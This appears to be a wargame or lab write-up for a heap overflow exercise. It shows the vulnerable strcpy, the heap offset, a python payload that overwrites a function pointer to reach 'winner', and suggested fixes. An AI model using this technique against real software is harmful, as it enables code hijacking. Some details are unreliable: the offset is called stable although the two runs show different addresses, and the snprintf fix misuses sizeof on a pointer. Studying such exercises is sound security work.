# ex10 — Heap overflow into an adjacent function pointer

Goal: `level passed`

## Assembly (paraphrased)

```
main(argc, argv):
    esp+0x18 = malloc(0x40)      ; data buffer   (64 bytes user)
    esp+0x1c = malloc(0x04)      ; fp holder     (4  bytes user)
    *(esp+0x1c)   = &nowinner    ; fp = nowinner
    printf("data is at %p, fp is at %p\n", data, fp)
    strcpy(data, argv[1])        ; <-- VULN: unbounded strcpy
    call *(*(esp+0x1c))           ; indirect call through *fp
```

There are two "win" functions in the binary:

```
08048464 <winner>  : puts("level passed")
08048478 <nowinner>: puts("level has not been passed")
```

The fp holder currently holds `&nowinner`. We need to make the indirect
call jump to `winner` at **`0x08048464`** by overwriting the fp holder's
data via the heap overflow.

## Heap layout

The binary prints the two heap addresses so we can measure the offset
directly:

```
$ ./ex10/bin AAAA
data is at 0x80c11e0, fp is at 0x80c1230
```

Distance from `data` to `fp` = `0x50 = 80` bytes (`malloc(0x40)`'s chunk
in this glibc reserves 72 bytes for user data + inter-chunk overhead,
so from user-of-chunk1 to user-of-chunk2 is 80). This is stable across
runs — malloc's slab is fresh, no fragmentation.

## Exploit

```
[80 bytes filler] [ &winner (little-endian) ]
       ^                    ^
       overflows data       overwrites *fp with &winner
       past its 64-byte
       user region and
       across chunk2's
       header/overhead
```

```bash
./ex10/bin "$(python3 -c "
import sys, struct
sys.stdout.buffer.write(b'A'*80 + struct.pack('<I', 0x08048464))
")"
```

Output:

```
data is at 0x80c01e0, fp is at 0x80c0230
level passed
```

`argv[1]` is a C string, so it cannot contain NUL — that's why we choose
`&winner = 0x08048464`, which is NUL-free (the trailing NUL that argv
adds falls one byte past `fp`, harmless).

## Fix

- `strcpy(dst, argv[1])` → `strncpy(dst, argv[1], 63); dst[63] = 0;` or
  `snprintf(dst, sizeof dst, "%s", argv[1])`.
- Don't store a function pointer next to a user-writable buffer without
  isolation; better yet, don't hold it in the heap at all — a switch on
  an enum has the same effect and no writable code path.
- CFI (`-fsanitize=cfi-icall`) would refuse the indirect call to a
  function whose type signature doesn't match.
